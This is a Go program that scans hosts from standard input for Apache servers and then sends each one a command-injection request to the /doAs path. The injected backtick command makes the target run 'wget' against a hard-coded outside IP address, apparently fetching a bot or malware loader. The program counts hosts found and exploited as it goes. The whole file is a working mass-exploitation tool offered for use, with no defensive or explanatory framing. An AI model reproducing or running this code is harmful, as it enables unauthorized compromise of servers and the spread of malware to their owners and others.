package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

var (
	total     int
	found     int
	exploited int

	user_agent = "Wget/1.14.1"

	payload = "wget http://138.68.57.62/sp"
)

func get_buf(conn net.Conn) string {
	buf := make([]byte, 512)
	conn.Read(buf)

	return string(buf)
}

func check_host(host string) bool {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		return false
	}

	defer conn.Close()

	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n", host, user_agent)

	buf := get_buf(conn)

	return strings.Contains(strings.ToLower(buf), "apache")
}

func process_host(host string) {
	total++

	if !check_host(host) {
		return
	}

	found++

	conn, err := net.Dial("tcp", host)
	if err != nil {
		return
	}

	defer conn.Close()

	fmt.Fprintf(conn, "GET /doAs?=`%s` HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n", payload, host, user_agent)

	buf := get_buf(conn)

	if strings.Contains(buf, "200 OK") {
		exploited++
	}
}

func title_writer() {
	i := 0

	for {
		time.Sleep(1 * time.Second)

		fmt.Printf("[%d's] Total [%d] - Found [%d] - Exploited [%d]\r\n", i, total, found, exploited)
		i++
	}
}

func main() {
	go title_writer()

	scan := bufio.NewScanner(os.Stdin)

	for scan.Scan() {
		if os.Args[1] == "listen" {
			go process_host(scan.Text())
		} else {
			go process_host(scan.Text() + ":" + os.Args[1])
		}
	}

	for {
		time.Sleep(1 * time.Second)
	}
}
